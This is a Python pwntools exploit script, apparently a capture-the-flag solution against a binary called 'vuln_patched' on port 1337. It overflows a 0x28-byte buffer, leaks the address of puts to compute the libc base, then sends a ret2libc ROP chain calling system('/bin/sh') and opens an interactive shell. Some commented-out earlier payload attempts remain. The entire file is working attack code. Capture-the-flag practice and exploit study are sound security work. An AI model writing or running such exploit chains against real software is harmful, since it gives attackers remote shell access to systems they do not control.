from pwn import *
from ctftools.pwn.common import connect

exe = ELF("vuln_patched")
libc = ELF("libc.so.6")
io = connect(exe, "host", 1337)

offset = 0x28
push_rbp_mov_rbp_rsp_pop_rcx_ret = 0x40117a # push rbp ; mov rbp, rsp ; pop rcx ; ret
pop_rbp_gadget = 0x40115d  # pop rbp ; ret
call_print_addr = exe.symbols.main + 66
ret = 0x40101a

payload = flat(
    pack(exe.symbols.print) * (offset // 8),
    push_rbp_mov_rbp_rsp_pop_rcx_ret, # mov rbp, rsp ;
    call_print_addr, # puts([rbp - 0x20])
    exe.symbols.main,
)
print(payload)

# payload = flat(
#     b'A' * offset,
#     pop_rbp_gadget,
#     exe.symbols.print + 0x20,
#     call_print_addr,
#     exe.symbols.main,
#     b'A' * offset,
#     exe.symbols.main
# )
# print(payload)

io.sendline(payload)
io.recvuntil(payload[:3])
print(io.recvline())

libc_puts_addr = int.from_bytes(io.recvline().strip(), 'little')
libc_base_addr = libc_puts_addr - libc.symbols.puts
libc.address = libc_base_addr

print(hex(libc.address))

# io.interactive()


rop = ROP(libc)
bin_sh = next(libc.search(b'/bin/sh'))
rop.call(libc.sym['system'], [bin_sh])

print(rop.dump())

payload = flat(
    b'A' * offset,
    rop.chain()
)
io.sendline(payload)

# rop = ROP(libc)

# payload = rop.system([next(libc.search(b"/bin/sh"))])
# print(hex(libc.symbols.puts))
# print(hex(libc.symbols.system))
# print(hex())
# print(payload)

io.interactive()
